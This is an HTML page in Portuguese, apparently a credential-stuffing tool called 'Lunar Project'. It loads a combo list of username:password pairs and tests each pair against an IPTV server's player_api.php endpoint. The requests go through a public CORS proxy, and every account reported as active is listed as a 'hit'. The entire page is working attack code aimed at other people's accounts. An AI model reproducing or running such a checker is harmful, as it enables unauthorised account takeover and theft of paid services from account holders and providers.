<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>LUNAR PROJECT — BY TUTSUKI</title>
<style>
  body { background-color: black; color: #00c38e; font-family: monospace; font-size: 18px; text-align: center; }
  .caixa { border: 2px solid #00c38e; padding: 10px; border-radius: 10px; margin: 10px auto; max-width: 750px; background: rgba(0,0,0,.55); }
  select, input { padding: 8px; border-radius: 5px; border: none; width: 90%; margin: 5px; background: #111; color: #00c38e; }
  button { padding: 8px 14px; background-color: #00c38e; border: none; border-radius: 5px; cursor: pointer; margin: 5px; font-weight: bold; }
  .progresso-fixo { background: #111; border: 2px solid #00c38e; padding: 10px; border-radius: 10px; margin-bottom: 10px; }
  .barra { background: #333; border-radius: 5px; overflow: hidden; height: 20px; margin: 5px 0; }
  .barra-fill { background: #00c38e; height: 100%; width: 0%; text-align: center; color: black; line-height: 20px; }
</style>
</head>
<body>
<header style="padding:20px; background:rgba(0,0,0,0.8); border-bottom:2px solid #00c38e;">
  <h1 style="margin:0;">🌘 LUNAR PROJECT</h1>
  <small>BY TUTSUKI</small>
</header>

<div class="caixa">
  <label>📂 Escolha o seu Combo.txt:</label><br>
  <input id="combo" type="file" accept=".txt"/>
  <label>🌐 Servidor (URL:Porta):</label><br>
  <input id="servidor" value="http://2025easy.lat:80" type="text"/><br>
  <label>🖊️ Seu Nick:</label><br>
  <input id="nick" value="Tutsuki" type="text"/><br>
  <button onclick="startScan()">🚀 INICIAR SCAN</button>
</div>

<div class="progresso-fixo caixa">
  <div>🔎 Testando ➤ <span id="comboStatus">---</span></div>
  <div>🔥 HITS ➤ <span id="hitsStatus">0</span></div>
  <div class="barra"><div class="barra-fill" id="barraPreenchida">0%</div></div>
</div>

<div class="caixa">
  <h3>Alvos Abatidos</h3>
  <div id="hitsBox" style="white-space:pre-wrap; text-align:left; font-size: 14px;"></div>
</div>

<script>
let hits = [];
async function startScan() {
  const srv = document.getElementById("servidor").value;
  const comboFile = document.getElementById("combo").files[0];
  const nick = document.getElementById("nick").value;
  if (!srv || !comboFile) return alert("Selecione Servidor e Combo!");
  
  const texto = await comboFile.text();
  const linhas = texto.split(/\r?\n/).filter(l => l.includes(":"));
  
  for (let i = 0; i < linhas.length; i++) {
    const combo = linhas[i].trim();
    const [u, p] = combo.split(":");
    document.getElementById("comboStatus").innerText = combo;
    
    let porc = Math.floor(((i + 1) / linhas.length) * 100);
    document.getElementById("barraPreenchida").style.width = porc + "%";
    document.getElementById("barraPreenchida").innerText = porc + "%";

    try {
      const url = `https://corsproxy.io/?${encodeURIComponent(srv + '/player_api.php?username=' + u + '&password=' + p)}`;
      const res = await fetch(url);
      const data = await res.json();

      if (data?.user_info?.status === "Active") {
        const resText = `✅ HIT [${nick}]: ${u}:${p}\n`;
        document.getElementById("hitsBox").textContent += resText;
        hits.push(resText);
        document.getElementById("hitsStatus").innerText = hits.length;
      }
    } catch (e) {}
  }
  alert("Scan Finalizado!");
}
</script>
</body>
</html>
